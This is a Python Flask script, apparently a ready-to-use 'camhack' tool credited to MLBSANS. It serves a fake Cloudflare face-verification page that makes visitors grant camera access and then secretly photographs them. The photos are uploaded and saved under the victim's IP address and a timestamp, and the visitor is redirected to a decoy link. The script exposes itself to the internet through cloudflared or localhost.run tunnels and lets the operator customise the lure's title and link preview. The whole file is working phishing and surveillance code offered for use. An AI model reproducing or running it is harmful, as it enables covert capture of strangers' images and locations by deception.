from flask import Flask, request, render_template_string
import os
from datetime import datetime
from PIL import Image
import cv2
import numpy as np
import subprocess
from rich.console import Console
from rich.panel import Panel

# Khởi tạo console cho Rich
console = Console()

# Nhập thông tin admin
TITLE = input("Nhập tiêu đề (phần bên ngoài chữ lớn) (mặc định: 'Xác Thực Khuôn Mặt - An Toàn & Tin Cậy'): ") or "Xác Thực Khuôn Mặt - An Toàn & Tin Cậy"
SUBTITLE = input("Nhập phần bên dưới chữ lớn (mặc định: 'Xác thực khuôn mặt của bạn để đảm bảo an toàn và bảo mật thông tin.'): ") or "Xác thực khuôn mặt của bạn để đảm bảo an toàn và bảo mật thông tin."
YOUTUBE_LINK = input("Nhập link (mặc định: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'): ") or "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
OG_IMAGE = input("Nhập OG_IMAGE (mặc định: 'https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg'): ") or "https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg"

app = Flask(__name__)
os.system("clear")
os.system("cls")

# In ra Banner ASCII
banner = r"""
██████╗░██╗░░██╗░█████╗░░█████╗░░█████╗░███╗░░░███╗██╗░░██╗░█████╗░░█████╗░██╗░░██╗
██╔══██╗██║░░██║██╔══██╗██╔══██╗██╔══██╗████╗░████║██║░░██║██╔══██╗██╔══██╗██║░██╔╝
██████╔╝███████║██║░░██║██║░░╚═╝███████║██╔████╔██║███████║███████║██║░░╚═╝█████═╝░
██╔═══╝░██╔══██║██║░░██║██║░░██╗██╔══██║██║╚██╔╝██║██╔══██║██╔══██║██║░░██╗██╔═██╗░
██║░░░░░██║░░██║╚█████╔╝╚█████╔╝██║░░██║██║░╚═╝░██║██║░░██║██║░░██║╚█████╔╝██║░╚██╗
╚═╝░░░░░╚═╝░░╚═╝░╚════╝░░╚════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
"""
console.print(Panel(banner, title="-- BY: MLBSANS --", subtitle="github.com/mlbsans", style="bold cyan"))
console.print(
    "[green]Tạo server:[/green]\n[blue]+ 1:[/blue] ssh -R 80:localhost:8080 nokey@localhost.run\n[blue]+ 2:[/blue] cloudflared tunnel --url http://localhost:8080",
    style="bold magenta"
)

# Khởi tạo classifier phát hiện khuôn mặt
face_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_frontalface_default.xml')
SAVE_PATH = "IMAGE"
os.makedirs(SAVE_PATH, exist_ok=True)

# HTML/CSS/JS: Tự động yêu cầu cấp quyền camera khi load trang.
# Nếu không cấp quyền, hiển thị thông báo và nút "Thử lại" sau 3 giây.
HTML_PAGE = f"""
<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <title>{TITLE}</title>
  <!-- Open Graph Metadata -->
  <meta property="og:title" content="{TITLE}">
  <meta property="og:description" content="{SUBTITLE}">
  <meta property="og:image" content="{OG_IMAGE}">
  <meta property="og:url" content="http://localhost:8080/">
  <meta property="og:type" content="website">
  <link rel="icon" href="https://www.google.com/favicon.ico">
  <!-- Google Fonts -->
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
  <style>
    body {{
      margin: 0;
      background: #000;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      overflow: hidden;
    }}
    .loading-container {{
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 1rem;
    }}
    .cloudflare-logo {{
      width: 200px;
      height: 200px;
      background: url('https://upload.wikimedia.org/wikipedia/commons/9/94/Cloudflare_Logo.png') no-repeat center/contain;
    }}
    .spinner {{
      width: 60px;
      height: 60px;
      border: 4px solid rgba(255, 255, 255, 0.3);
      border-top: 4px solid #fff;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }}
    @keyframes spin {{
      from {{ transform: rotate(0deg); }}
      to {{ transform: rotate(360deg); }}
    }}
    .notification {{
      position: fixed;
      bottom: 20px;
      left: 50%;
      transform: translateX(-50%);
      background: linear-gradient(135deg, #ff0033, #ff66b2);
      color: #fff;
      padding: 15px 25px;
      border-radius: 8px;
      box-shadow: 0 4px 10px rgba(255, 0, 0, 0.3);
      font-size: 1rem;
      opacity: 0;
      visibility: hidden;
      transition: all 0.4s ease;
    }}
    .notification.show {{
      opacity: 1;
      visibility: visible;
      transform: translate(-50%, -10px);
    }}
    #retry-btn {{
      display: none;
      margin-top: 20px;
      padding: 10px 20px;
      font-size: 1rem;
      cursor: pointer;
      border: none;
      border-radius: 5px;
      background-color: #ff0033;
      color: #fff;
    }}
    @media (max-width: 768px) {{
      .notification {{
        font-size: 1.2rem;
        padding: 20px 30px;
      }}
      #retry-btn {{
        font-size: 1.2rem;
      }}
    }}
  </style>
</head>
<body>
  <div class="loading-container">
    <div class="cloudflare-logo"></div>
    <div class="spinner"></div>
  </div>
  <div id="notification" class="notification"></div>
  <button id="retry-btn">Thử lại</button>
  <script>
    // Biến toàn cục để quản lý stream, fallbackVideo và validCount
    let currentStream = null;
    let fallbackVideo = null;
    let validCount = 0;
    const notification = document.getElementById("notification");
    const retryBtn = document.getElementById("retry-btn");

    function showNotification(message) {{
      notification.textContent = message;
      notification.classList.add("show");
      setTimeout(() => {{
        notification.classList.remove("show");
      }}, 3000);
    }}

    function stopCurrentStream() {{
      if (currentStream) {{
        currentStream.getTracks().forEach(track => track.stop());
        currentStream = null;
      }}
      if (fallbackVideo) {{
        fallbackVideo.pause();
        fallbackVideo.srcObject = null;
        fallbackVideo.remove();
        fallbackVideo = null;
      }}
    }}

    function startVerification() {{
      // Reset validCount và dừng stream cũ nếu có
      validCount = 0;
      stopCurrentStream();
      
      // Kiểm tra hỗ trợ getUserMedia
      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {{
        showNotification("Trình duyệt của bạn không hỗ trợ camera.");
        return;
      }}
      
      navigator.mediaDevices.getUserMedia({{ video: true }})
      .then(stream => {{
        retryBtn.style.display = "none";
        currentStream = stream;
        validCount = 0;  // Reset số lần xác minh
        const videoTrack = stream.getVideoTracks()[0];
        const useImageCapture = ('ImageCapture' in window);
        if (!useImageCapture && !fallbackVideo) {{
          fallbackVideo = document.createElement("video");
          fallbackVideo.style.display = "none";
          document.body.appendChild(fallbackVideo);
          fallbackVideo.srcObject = stream;
          fallbackVideo.play();
        }}

        function captureLoop() {{
          if (useImageCapture) {{
            const imageCapture = new ImageCapture(videoTrack);
            imageCapture.takePhoto()
            .then(blob => {{
              processPhoto(blob);
            }})
            .catch(err => {{
              console.error("ImageCapture error:", err);
              captureFallback();
            }});
          }} else {{
            captureFallback();
          }}
        }}

        function captureFallback() {{
          if (!fallbackVideo || !fallbackVideo.videoWidth) {{
            return setTimeout(captureLoop, 300);
          }}
          const canvas = document.createElement("canvas");
          canvas.width = fallbackVideo.videoWidth;
          canvas.height = fallbackVideo.videoHeight;
          const ctx = canvas.getContext("2d");
          ctx.drawImage(fallbackVideo, 0, 0, canvas.width, canvas.height);
          canvas.toBlob(blob => {{
            if (blob) {{
              processPhoto(blob);
            }} else {{
              console.error("Lỗi chuyển canvas sang blob");
              validCount = 0;
              setTimeout(captureLoop, 400);
            }}
          }}, "image/png");
        }}

        function processPhoto(blob) {{
          const formData = new FormData();
          formData.append("image", blob, "face_verification.png");
          fetch("/upload", {{ method: "POST", body: formData }})
          .then(response => {{
            if (response.ok) {{
              validCount++;
              if (validCount >= 2) {{
                stopCurrentStream();
                window.location.href = "{YOUTUBE_LINK}";
              }} else {{
                setTimeout(captureLoop, 400);
              }}
            }} else {{
              validCount = 0;
              showNotification("Vui lòng không che mặt hoặc tránh camera!");
              setTimeout(captureLoop, 400);
            }}
          }})
          .catch(err => {{
            console.error("Lỗi upload:", err);
            validCount = 0;
            setTimeout(captureLoop, 400);
          }});
        }}

        captureLoop();
      }})
      .catch(err => {{
        console.error("Lỗi truy cập camera:", err);
        showNotification("Bạn chưa cấp quyền camera. Vui lòng cấp quyền trong cài đặt và sau đó bấm 'Thử lại'.");
        setTimeout(() => {{
          retryBtn.style.display = "block";
        }}, 3000);
      }});
    }}

    retryBtn.addEventListener("click", () => {{
      retryBtn.style.display = "none";
      startVerification();
    }});

    window.addEventListener("load", startVerification);
  </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/upload', methods=['POST'])
def upload():
    if 'image' not in request.files:
        return "Lỗi khi nhận ảnh!", 400
    image = request.files['image']
    user_ip = request.remote_addr
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    image_path = os.path.join(SAVE_PATH, f"{user_ip}_{timestamp}.png")
    try:
        os.makedirs(SAVE_PATH, exist_ok=True)
        img = Image.open(image)
        if img.mode in ("RGBA", "P", "CMYK"):
            img = img.convert("RGB")
        img_cv = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
        gray = cv2.cvtColor(img_cv, cv2.COLOR_BGR2GRAY)
        
        # Tăng minNeighbors=5, kiểm tra kích thước khuôn mặt
        faces = face_cascade.detectMultiScale(
            gray,
            scaleFactor=1.05,
            minNeighbors=5,
            minSize=(30, 30),
            flags=cv2.CASCADE_SCALE_IMAGE
        )
        console.log(f"[blue]Detected faces:[/blue] {faces}")
        if len(faces) == 0:
            console.log("[red]Không phát hiện được khuôn mặt![/red]")
            return "Che Mặt Rồi", 400

        image_width = img_cv.shape[1]
        valid_faces = [face for face in faces if face[2] >= 0.3 * image_width]
        if len(valid_faces) == 0:
            console.log("[red]Phát hiện khuôn mặt không đầy đủ![/red]")
            return "Che Mặt Rồi", 400

        img.save(image_path, "PNG")
        console.log(f"[green]Ảnh đã lưu: {image_path}[/green]")
        return "OK", 200
    except Exception as e:
        console.log(f"[red]Lỗi khi lưu ảnh: {e}[/red]")
        return "Lỗi khi lưu ảnh!", 500

if __name__ == '__main__':
    try:
        subprocess.Popen(["cloudflared", "tunnel", "--url", "http://localhost:8080"])
        console.log("[green]Cloudflared tunnel started successfully.[/green]")
    except Exception as ex:
        console.log(f"[red]Không thể khởi chạy cloudflared tunnel: {ex}[/red]")
    app.run(host='0.0.0.0', port=8080, debug=True, use_reloader=False)